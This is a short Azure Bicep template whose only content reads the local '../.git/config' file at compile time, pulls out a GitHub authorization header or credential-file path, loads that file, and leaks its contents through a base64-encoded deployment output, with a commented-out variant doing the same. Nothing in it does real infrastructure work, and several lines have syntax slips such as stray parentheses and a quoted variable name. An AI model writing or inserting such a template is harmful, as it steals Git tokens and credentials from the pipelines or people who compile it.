targetScope = 'subscription'

/*
var fileContent = loadTextContent('../.git/config')
var afterPrefix = split(fileContent, 'http.https://github.com ')[1]
var extractme = split(afterPrefix, '\n')[0])
var export12 = loadFileAsBase64(base64(extractme))
output export string = export12
*/


var fileContent = loadTextContent('../.git/config')
var afterPrefix = split(fileContent, '	path = ')[1]
var credpath = split(afterPrefix, '\n')[0])
var credFile = loadTextContent('credpath')
var exitwitherrro = loadFileAsBase64(base64(credFile))
output export string = exitwitherrro
